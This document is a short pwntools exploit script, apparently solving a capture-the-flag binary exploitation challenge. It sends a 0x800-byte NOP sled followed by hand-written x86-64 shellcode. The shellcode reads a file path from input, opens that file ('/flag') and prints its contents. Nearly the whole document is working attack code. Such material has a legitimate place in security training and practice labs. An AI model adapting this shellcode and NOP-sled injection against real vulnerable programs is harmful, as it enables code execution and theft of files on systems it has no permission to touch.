from pwn import *

context.arch = 'amd64'

p = process('/challenge/binary-exploitation-nopsled-shellcode')

sh = asm('''
    mov r9, QWORD PTR [rbp + 0x28]
    sub r9, 0x1547
    add r9, 0x4010

    mov rdi, 0
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, r9
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 1
    syscall
''')

payload = b'\x90' * 0x800
payload += sh

p.send(payload)
p.send(b'/flag\x00')

p.interactive()
